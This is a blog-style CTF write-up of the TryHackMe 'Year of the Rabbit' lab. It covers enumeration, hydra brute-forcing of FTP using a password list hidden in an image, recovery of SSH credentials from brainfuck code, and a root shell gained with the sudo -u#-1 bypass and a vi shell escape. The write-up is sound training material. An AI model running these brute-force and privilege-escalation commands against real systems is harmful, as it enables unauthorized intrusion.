---
title: "TryHackMe - Year of the Rabbit"
author: Nasrallah
description: ""
date: 2022-09-07 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, hydra, bruteforce, sudo, cve]
img_path: /assets/img/tryhackme/yearoftherabbit
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit) from [TryHackMe](https://tryhackme.com). The target is running a web server where we find an image that contains a list of passwords that we use to brute force the ftp server. After finding the right password we login to find a file that has some weird text, we decode that to get ssh credentials. Once we're in the target machine we find a secret file with on of the user's password. After switching to that user we exploit a sudo cve to get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.243.82
Host is up (0.086s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 3 open ports, 21 running vsftp, 22 running OpenSSH, and 80 running Apache web server.

## Web

Navigate to the web page.

![](1.png)

It's the default page for apache.

### Gobuster

Let's run a directory scan.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.243.82/  | tee scans/gobuster                                                 130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.82/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/01 04:54:20 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.243.82/assets/]
/index.html           (Status: 200) [Size: 7853]                                 
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================

```

We found **/assets/** directory, let's look at it.

![](2.png)

We got a rick roll video and a css file. Let's check the **style.css** file.

![](3.png)

We found a secret page, but when we browse to it, it redirects us to rick roll youtube video.

Next i used curl to request the page and got this.

![](4.png)

Got the real hidden directory.

![](5.png)

There is an image there, we can download it to our machine with `wget http://10.10.243.82/WExYY2Cv-qU/Hot_Babe.png`

If we run `strings` with the image, we find the following.

![](6.png)

We a username for ftp and a list of passwords.

We either copy the list manually or use the following command like i did.

```bash
strings Hot_Babe.png | tail -n 82 > pass.txt
```

![](7.png)


# **Foothold**

## Hydra

Now let's use `hydra` to brute force the ftp server.

```bash
hydra -l ftpuser -P pass.txt 10.10.243.82 ftp
```

![](8.png)

## FTP

Let's login to the ftp server.

![](9.png)

Found some a text file and downloaded it with `get {filename}`. Let's see what it has.

![](10.png)

From my experience, i know this is `brainfuck` programming language. Let's go to [dcode](https://www.dcode.fr/brainfuck-language) and execute this script.

![](11.png)

Great! We got hte credentials. Let's login with ssh.

![](12.png)

# **Privilege Escalation**

When we logged in, we got the following message.

```
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```

There is a secret place, i used the command `locate s3cr3t` and got this.

![](13.png)

We found the secret place. Let's print the secret file.

![](14.png)

Got the password for that user. Let's switch to `Gwendoline`.

![](15.png)

Let's check our privileges with `sudo -l`.

![](16.png)

We can execute `vi` but not as root. Let's check `sudo`'s version.

```terminal
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```

The version of sudo is 1.8.10p3, and if we search for any exploits in this version we find [this](https://www.exploit-db.com/exploits/47502).

![](18.png)

We see if we add `-u#-1` to our sudo command we can execute vi as root, so let's go check [GTFObins](https://gtfobins.github.io/gtfobins/vi/#shell).

![](17.png)

We're going to use the following commands to get a root shell.

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

:set shell=/bin/sh

:shell
```

![](19.png)

Got the root shell.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
